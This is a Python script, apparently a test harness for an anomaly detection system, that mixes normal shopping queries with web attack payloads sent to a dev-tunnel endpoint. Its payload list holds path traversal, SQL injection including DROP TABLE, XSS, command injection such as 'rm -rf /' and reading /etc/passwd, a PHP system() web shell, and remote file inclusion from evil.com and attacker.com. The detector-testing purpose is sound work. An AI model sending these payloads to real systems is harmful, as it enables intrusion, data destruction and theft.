#!/usr/bin/env python3
"""
Real-time attack simulation and testing tools for the live anomaly detection system.
Sends various attack patterns to test the detection accuracy.
"""
import requests
import asyncio
import aiohttp
import json
import time
import random
from typing import List, Dict, Tuple
from datetime import datetime
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class AttackSimulator:
    """Simulates various web attack patterns to test the anomaly detection system"""
    
    def __init__(self, target_url: str = "https://1x31xtw5-80.inc1.devtunnels.ms/data"):
        """
        Initialize the attack simulator
        
        Args:
            target_url: Target endpoint to test
        """
        self.target_url = target_url
        self.results = []
        
        # Attack patterns database
        self.attack_patterns = {
            "path_traversal": [
                "../../../etc/passwd",
                "..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "..%2f..%2f..%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd"
            ],
            "sql_injection": [
                "'; DROP TABLE users; --",
                "1' OR '1'='1",
                "admin'--",
                "' UNION SELECT null,null,null--",
                "'; INSERT INTO users VALUES ('hacker','pwd'); --"
            ],
            "xss": [
                "<script>alert('XSS')</script>",
                "javascript:alert('XSS')",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "'\"><script>alert('XSS')</script>"
            ],
            "command_injection": [
                "; ls -la",
                "&& whoami",
                "| cat /etc/passwd",
                "; rm -rf /",
                "&& ping -c 4 google.com"
            ],
            "nosql_injection": [
                "[$ne]=null",
                "[$gt]=''",
                "[$regex]=.*",
                "[$where]=function(){ return true; }",
                "[$or][0][username]=admin"
            ],
            "lfi": [
                "/etc/passwd",
                "C:\\windows\\system32\\drivers\\etc\\hosts",
                "php://filter/read=convert.base64-encode/resource=index",
                "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4=",
                "file:///etc/passwd"
            ],
            "rfi": [
                "http://evil.com/shell.txt",
                "https://pastebin.com/raw/malicious",
                "ftp://attacker.com/backdoor.php",
                "data://text/plain,<?php system($_GET[c]); ?>",
                "http://127.0.0.1/malicious.php"
            ]
        }
        
        # Normal patterns for comparison
        self.normal_patterns = {
            "search": ["laptop", "phone", "book", "shirt", "shoes"],
            "categories": ["electronics", "clothing", "books", "home", "sports"],
            "filters": ["price", "rating", "availability", "brand", "color"],
            "actions": ["view", "add", "remove", "update", "search"]
        }
    
    async def send_request(self, session: aiohttp.ClientSession, method: str, 
                          params: Dict = None, headers: Dict = None, 
                          data: str = None) -> Dict:
        """
        Send a request and capture the response
        
        Args:
            session: HTTP session
            method: HTTP method
            params: Query parameters
            headers: Request headers
            data: Request body
            
        Returns:
            Dictionary with request details and response info
        """
        start_time = time.time()
        
        try:
            async with session.request(
                method, 
                self.target_url, 
                params=params, 
                headers=headers, 
                data=data,
                timeout=aiohttp.ClientTimeout(total=10)
            ) as response:
                response_time = (time.time() - start_time) * 1000
                
                result = {
                    'timestamp': datetime.now().isoformat(),
                    'method': method,
                    'url': str(response.url),
                    'params': params or {},
                    'headers': headers or {},
                    'data': data or "",
                    'status_code': response.status,
                    'response_time_ms': response_time,
                    'response_headers': dict(response.headers),
                    'content_length': response.headers.get('Content-Length', '0')
                }
                
                return result
                
        except Exception as e:
            logger.error(f"Request failed: {e}")
            return {
                'timestamp': datetime.now().isoformat(),
                'method': method,
                'params': params or {},
                'headers': headers or {},
                'data': data or "",
                'error': str(e),
                'response_time_ms': (time.time() - start_time) * 1000
            }
    
    def generate_normal_requests(self, count: int = 10) -> List[Tuple]:
        """Generate normal e-commerce requests"""
        requests = []
        
        for _ in range(count):
            request_type = random.choice(['search', 'browse', 'filter'])
            
            if request_type == 'search':
                query = random.choice(self.normal_patterns['search'])
                requests.append((
                    'GET',
                    {'q': query, 'page': str(random.randint(1, 5))},
                    {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'},
                    None
                ))
            
            elif request_type == 'browse':
                category = random.choice(self.normal_patterns['categories'])
                requests.append((
                    'GET',
                    {'category': category, 'sort': random.choice(self.normal_patterns['filters'])},
                    {'User-Agent': 'Chrome/120.0.0.0 Safari/537.36'},
                    None
                ))
            
            else:  # filter
                requests.append((
                    'GET',
                    {
                        'filter': random.choice(self.normal_patterns['filters']),
                        'value': str(random.randint(1, 100))
                    },
                    {'User-Agent': 'Firefox/119.0'},
                    None
                ))
        
        return requests
    
    def generate_attack_requests(self) -> List[Tuple]:
        """Generate various attack requests"""
        attack_requests = []
        
        for attack_type, payloads in self.attack_patterns.items():
            for payload in payloads:
                # GET request with payload in parameter
                attack_requests.append((
                    'GET',
                    {'id': payload},
                    {'User-Agent': f'AttackTool/{attack_type}'},
                    None
                ))
                
                # POST request with payload in body
                attack_requests.append((
                    'POST',
                    {},
                    {
                        'User-Agent': f'ExploitKit/{attack_type}',
                        'Content-Type': 'application/json'
                    },
                    json.dumps({'data': payload})
                ))
        
        return attack_requests
    
    async def run_simulation(self, normal_count: int = 20, include_attacks: bool = True):
        """
        Run a complete attack simulation
        
        Args:
            normal_count: Number of normal requests to generate
            include_attacks: Whether to include attack patterns
        """
        print("🚀 Starting Attack Simulation")
        print("="*60)
        print(f"🎯 Target: {self.target_url}")
        print(f"📊 Normal requests: {normal_count}")
        print(f"🚨 Attack patterns: {'Enabled' if include_attacks else 'Disabled'}")
        print("="*60)
        
        async with aiohttp.ClientSession() as session:
            all_requests = []
            
            # Generate normal requests
            normal_requests = self.generate_normal_requests(normal_count)
            for req in normal_requests:
                all_requests.append(('NORMAL', req))
            
            # Generate attack requests
            if include_attacks:
                attack_requests = self.generate_attack_requests()
                for req in attack_requests:
                    all_requests.append(('ATTACK', req))
            
            # Shuffle requests to simulate realistic traffic
            random.shuffle(all_requests)
            
            print(f"\n📝 Generated {len(all_requests)} total requests")
            print("🔄 Sending requests...\n")
            
            for i, (req_type, (method, params, headers, data)) in enumerate(all_requests):
                # Send request
                result = await self.send_request(session, method, params, headers, data)
                result['attack_type'] = req_type
                self.results.append(result)
                
                # Log progress
                status = "✅" if result.get('status_code', 0) == 200 else "❌"
                attack_indicator = "🚨" if req_type == "ATTACK" else "🔵"
                
                print(f"{attack_indicator} [{i+1:3d}/{len(all_requests)}] {status} {method} - {req_type}")
                
                # Small delay to avoid overwhelming the server
                await asyncio.sleep(0.5)
            
            print(f"\n✅ Simulation completed!")
            self.print_summary()
    
    def print_summary(self):
        """Print simulation summary"""
        if not self.results:
            print("No results to summarize")
            return
        
        normal_requests = [r for r in self.results if r['attack_type'] == 'NORMAL']
        attack_requests = [r for r in self.results if r['attack_type'] == 'ATTACK']
        
        successful_normal = len([r for r in normal_requests if r.get('status_code') == 200])
        successful_attacks = len([r for r in attack_requests if r.get('status_code') == 200])
        
        avg_response_time = sum(r.get('response_time_ms', 0) for r in self.results) / len(self.results)
        
        print("\n" + "="*60)
        print("📊 SIMULATION SUMMARY")
        print("="*60)
        print(f"📤 Total Requests Sent: {len(self.results)}")
        print(f"🔵 Normal Requests: {len(normal_requests)} (Success: {successful_normal})")
        print(f"🚨 Attack Requests: {len(attack_requests)} (Success: {successful_attacks})")
        print(f"⚡ Average Response Time: {avg_response_time:.2f}ms")
        print("="*60)
        
        # Show sample attack patterns tested
        print("\n🚨 ATTACK PATTERNS TESTED:")
        for attack_type in self.attack_patterns.keys():
            count = len([r for r in attack_requests if attack_type in r.get('headers', {}).get('User-Agent', '')])
            print(f"   {attack_type.replace('_', ' ').title()}: {count} variations")
    
    def save_results(self, filename: str = None):
        """Save simulation results to JSON file"""
        if filename is None:
            filename = f"attack_simulation_{int(time.time())}.json"
        
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2, default=str)
        
        print(f"💾 Results saved to: {filename}")

async def main():
    """Main function for attack simulation"""
    simulator = AttackSimulator()
    
    try:
        # Run the simulation
        await simulator.run_simulation(normal_count=15, include_attacks=True)
        
        # Save results
        simulator.save_results()
        
    except KeyboardInterrupt:
        print("\n⏹️  Simulation stopped by user")
        simulator.print_summary()
        simulator.save_results()

if __name__ == "__main__":
    asyncio.run(main())